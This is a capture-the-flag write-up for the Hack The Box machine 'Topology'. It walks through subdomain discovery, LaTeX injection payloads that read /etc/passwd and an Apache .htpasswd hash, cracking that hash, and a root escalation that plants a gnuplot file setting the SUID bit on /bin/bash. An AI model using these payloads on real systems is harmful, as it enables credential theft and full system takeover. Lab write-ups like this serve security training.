---
description: https://app.hackthebox.com/machines/Topology
---

# Topology

##

<figure><img src="../../../.gitbook/assets/Topology.png" alt=""><figcaption></figcaption></figure>

## Nmap scan

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+vPGrMrUKptY7vMtBZuaDUQTNURCs5lRBkCFZIrXTGf/Xmg9MYZTnwm+0dMjIZTUZnQvbj4kdsmzWUOxg5Leumcy+pR/AhBqLw2wyC4kcX+fr/1mcAgbqZnCczedIcQyjjO9M1BQqUMQ7+rHDpRBxV9+PeI9kmGyF6638DJP7P/R2h1N9MuAlVohfYtgIkEMpvfCUv5g/VIRV4atP9x+11FHKae5/xiK95hsIgKYCQtWXvV7oHLs3rB0M5fayka1vOGgn6/nzQ99pZUMmUxPUrjf4V3Pa1XWkS5TSv2krkLXNnxQHoZOMQNKGmDdk0M8UfuClEYiHt+zDDYWPI672OK/qRNI7azALWU9OfOzhK3WWLKXloUImRiM0lFvp4edffENyiAiu8sWHWTED0tdse2xg8OfZ6jpNVertFTTbnilwrh2P5oWq+iVWGL8yTFeXvaSK5fq9g9ohD8FerF2DjRbj0lVonsbtKS1F0uaDp/IEaedjAeE=
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR4Yogc3XXHR1rv03CD80VeuNTF/y2dQcRyZCo4Z3spJ0i+YJVQe/3nTxekStsHk8J8R28Y4CDP7h0h9vnlLWo=
|   256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
80/tcp open  http    syn-ack Apache httpd 2.4.41
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
Service Info: Host: topology.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Directory scan&#x20;

* Bruteforcing wasn't much helpful for this machine
* Found a subdomain on the src code of homepage&#x20;

```bash
$ curl -q -s 10.10.11.217 | grep ".htb"                                                                                                                                                [0]
<p><i class="fa fa-envelope fa-fw w3-margin-right w3-large w3-text-grey"></i>lklein@topology.htb</p>
<p>• <a href="http://latex.topology.htb/equation.php">LaTeX Equation Generator</a> - create .PNGs of LaTeX

```

* subdomani : `latex.topology.htb`
* URL that was given : `http://latex.topology.htb/equation.php`

## Subdomain scan

```bash
└─➜ ffuf -u http://topology.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.topology.htb' -fs 6767                                    [0]

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : http://topology.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.topology.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 6767
________________________________________________

[Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 858ms]
    * FUZZ: dev

[Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 517ms]
    * FUZZ: stats
 
:: Progress: [4989/4989] :: Job [1/1] :: 13 req/sec :: Duration: [0:03:56] :: Errors: 0 ::
```

* domains we found : `stats` , `dev` and `latex.`
* the `stats` domain had statistics for the website, `dev` had a username and password for login

## User shell

* The intesting domain was `latex`&#x20;

<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption><p>Just a page which converts latex to image</p></figcaption></figure>

* We'll need to do `latex injection` attack.

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection#latex-injection" %}
There's list of payloads we can spray&#x20;
{% endembed %}

* We can't get RCE since all things were blacklisted but, there was one payload working where we can read files
* Payload : `\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}`
* Final Payload : `$\lstinputlisting{/etc/passwd}$`

### Ssh vdaisley

* we can't get the RCE, but reading files is also important
* I tried with getting ssh keys, but found out there were no keys in vdaisley's directory
* After a while, i thought to get password for `dev.topology.htb`&#x20;
* On google search I found out `.htpasswd` is where `Apache` server stores the password.



* GET PASSWORD FOR `dev` subdomain : `$\lstinputlisting{/var/www/dev/.htpasswd}$`
* foudn the hash :tada:

```bash
└─➜ cat hash.txt                                                                                                                                                                         [0]
<snipped>:$apr1$1ON <--SNIPPED--> zAIbIxTY0
```

* I used john to crack the hash
* BOOOM DONEEEEEEE, we are now user.



## Root shell

* First i looked files that belongs to user \<snipped>

```bash
bash-5.0$ find / -user $(whoami) 2>/dev/null | grep -v '^/proc\|^/run\|^/sys\|^/tmp\|^/dev'
```

* Then i tried with finding sudo bits

```bash
bash-5.0$ find / -perm -4000 2>/dev/null
/usr/sbin/pppd
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/bash
/usr/bin/chfn
bash-5.0$
```

* Nothing was helpful so i checked `/opt` and found intresting folder&#x20;

```bash
bash-5.0$ ls -la
total 12
drwxr-xr-x  3 root root 4096 May 19 13:04 .
drwxr-xr-x 18 root root 4096 Jun 12 10:37 ..
drwx-wx-wx  2 root root 4096 Nov  4 03:20 gnuplot
```

* We dont have read access on this BUT we do have write access to it.
* I ran `pspy64` tool in the box

```bash
2023/11/04 04:15:01 CMD: UID=0     PID=33937  | /usr/sbin/CRON -f
2023/11/04 04:15:01 CMD: UID=0     PID=33936  | /usr/sbin/CRON -f
2023/11/04 04:15:01 CMD: UID=0     PID=33939  | find /opt/gnuplot -name *.plt -exec gnuplot {} ;
2023/11/04 04:15:01 CMD: UID=0     PID=33938  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
```

* So there's a cronjob which runs with `root` privileges, it runs all the files that ends with `.plt`&#x20;
* Since we have write access to `/opt/gnuplot` we can write malicious code & wait for the `cronjob` to finish things for us.

```bash
echo 'system "chmod u+s /bin/bash"' > ./gnuplot/shellll.plt
```

```bash
$ :/opt$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

AND DONE WE ARE ROOOOOOOOT

```bash
bash-5.0# whoami
root
bash-5.0# ls /root/root.txt
/root/root.txt
bash-5.0#
```



....................heapbytes's still pwning things.
